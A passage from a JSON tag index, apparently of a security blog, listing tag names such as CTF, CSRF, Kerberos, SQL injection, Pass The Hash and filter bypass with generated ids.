7or0ildu13ri"},{"name":"管道","_id":"cjuam83md005h7or0ovx5jbqa"},{"name":"文件权限","_id":"cjuam83me005i7or0am7rhfh9"},{"name":"CTF","_id":"cjuam83mg005o7or01pjt82wy"},{"name":"CSRF","_id":"cjuam83mg005p7or087jwo17k"},{"name":"跨站请求伪造","_id":"cjuam83mh005s7or0e5oeruod"},{"name":"NTLM","_id":"cjuam83n0005y7or0orpi6bmz"},{"name":"Kerberos","_id":"cjuam83n600647or0z4e9axgj"},{"name":"SQL注入","_id":"cjuam83nd006b7or07mo4j1xe"},{"name":"MySQL","_id":"cjuam83ni006i7or01x09xlw1"},{"name":"编码与解码","_id":"cjuam83nk006n7or029a3wz1z"},{"name":"HTML文档解析","_id":"cjuam83nm006t7or0tt30gy29"},{"name":"暴力破解","_id":"cjuam83nn006u7or0kxukeea3"},{"name":"Pass The Hash","_id":"cjuam83no006x7or0ldu09w2d"},{"name":"文件上传","_id":"cjuam83np00707or0dredx2bt"},{"name":"过滤与绕过","_id":"cjuam83ol00737or0qmsgmii6"}]}}